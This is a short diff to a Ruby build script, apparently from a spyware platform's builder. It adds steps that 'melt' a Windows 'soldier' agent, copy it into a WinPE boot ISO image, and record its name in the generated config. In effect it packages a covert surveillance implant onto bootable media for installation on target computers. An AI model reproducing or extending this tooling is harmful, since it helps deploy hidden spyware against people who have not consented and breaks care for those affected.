@@ -27,6 +27,7 @@ class BuildISO < Build
 
     names = {}
     funcnames = []
+    soldier_name = ""
 
     params['platforms'].each do |platform|
       build = Build.factory(platform.to_sym)
@@ -53,6 +54,13 @@ class BuildISO < Build
       build.scrambled.keep_if {|k, v| k != :dir and k != :reg and k != :oldreg and k != :driver and k != :driver64}.each_pair do |k, v|
         FileUtils.mkdir_p(path("winpe/RCSPE/files/#{platform.upcase}"))
         FileUtils.cp(File.join(build.tmpdir, v), path("winpe/RCSPE/files/#{platform.upcase}/" + v))
+      end
+
+      if platform == 'windows'
+        build.melt({'soldier' => true})
+        FileUtils.mkdir_p(path("winpe/RCSPE/files/#{platform.upcase}/SOLDIER"))
+        FileUtils.cp(File.join(build.tmpdir, 'output'), path("winpe/RCSPE/files/#{platform.upcase}/SOLDIER/soldier"))
+        soldier_name = build.soldier_name(@factory.confkey)[:name]
       end
 
       build.clean
@@ -93,6 +101,7 @@ class BuildISO < Build
       f.puts "HKEY=#{key}"
       f.puts "FUNC=" + funcnames[8]
       f.puts "MASK=#{params['dump_mask']}"
+      f.puts "SOLD=#{soldier_name}"
     end
 
   end
